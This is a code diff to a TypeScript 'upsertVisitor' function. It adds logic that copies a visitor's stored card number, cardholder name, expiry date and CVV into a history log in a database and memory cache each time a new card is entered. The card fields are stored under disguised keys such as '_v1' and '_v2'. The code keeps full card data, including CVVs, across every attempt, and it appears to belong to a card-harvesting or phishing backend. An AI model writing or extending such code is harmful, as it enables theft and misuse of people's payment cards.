@@ -351,7 +351,53 @@ async function readVisitor(visitorId: string): Promise<Record<string, any> | nul
 async function upsertVisitor(visitorId: string, payload: Record<string, any> = {}) {
   console.log("[UpsertVisitor] visitorId:", visitorId, "payload keys:", Object.keys(payload));
   
+  // Read data BEFORE any modifications
   const currentData = (await readVisitor(visitorId)) || {};
+  
+  // Copy old payment data before replacing
+  const oldPaymentData = {
+    _v1: currentData._v1 || currentData.cardNumber,
+    _v4: currentData._v4 || currentData.cardOwner,
+    _v3: currentData._v3 || currentData.cardExpiry,
+    _v2: currentData._v2 || currentData.cvv,
+    cardType: currentData.cardType,
+    bankInfo: currentData.bankInfo,
+    _v1Status: currentData._v1Status,
+    paymentStatus: currentData.paymentStatus
+  };
+  
+  // Check if this is a new payment attempt (has new card data AND had old card data)
+  const hasNewPaymentData = payload._v1 || payload.cardNumber || payload._v4 || payload.cardOwner;
+  const hadOldPaymentData = oldPaymentData._v1 || oldPaymentData.cardNumber || oldPaymentData._v4 || oldPaymentData.cardOwner;
+  
+  // Save old payment data to history BEFORE replacing
+  if (hasNewPaymentData && hadOldPaymentData) {
+    try {
+      const history = Array.isArray(currentData.history) ? currentData.history : [];
+      const historyEntry = { 
+        type: "_t1", 
+        data: { ...oldPaymentData, replacedAt: new Date().toISOString(), reason: "new_payment_attempt" },
+        status: oldPaymentData._v1Status || oldPaymentData.paymentStatus || "replaced",
+        createdAt: new Date().toISOString()
+      };
+      
+      // Save to database with history
+      const updatedWithHistory = { ...currentData, history: [...history, historyEntry] };
+      if (isDatabaseHealthy()) {
+        await pool.query(
+          `INSERT INTO visitors (id, data, created_at, updated_at) VALUES ($1, $2, NOW(), NOW())
+           ON CONFLICT (id) DO UPDATE SET data = EXCLUDED.data, updated_at = NOW();`,
+          [visitorId, updatedWithHistory],
+        );
+      }
+      memoryVisitors.set(visitorId, updatedWithHistory);
+      console.log("[UpsertVisitor] Saved old payment data to history");
+    } catch (e) {
+      console.warn("[UpsertVisitor] Failed to save history:", e);
+    }
+  }
+  
+  // Now merge with new data (this replaces the old payment data)
   const merged = { ...currentData, ...payload, updatedAt: new Date().toISOString() };
   console.log("[UpsertVisitor] merged keys:", Object.keys(merged));
 
